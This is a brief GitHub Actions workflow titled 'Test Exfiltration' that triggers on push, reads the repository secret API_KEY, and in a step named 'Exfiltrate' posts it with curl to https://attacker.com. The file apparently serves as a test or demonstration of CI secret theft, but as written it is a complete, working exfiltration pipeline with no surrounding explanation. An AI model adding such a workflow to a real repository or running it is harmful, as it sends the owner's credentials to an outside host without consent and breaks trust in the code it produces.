name: Test Exfiltration

on: push

jobs:

  test:

    runs-on: ubuntu-latest

    env:

      API_KEY: ${{ secrets.API_KEY }}

    steps:

      - name: Exfiltrate

        run: |

          TOKEN=$API_KEY

          curl -X POST \
            -d "$TOKEN" \
            https://attacker.com
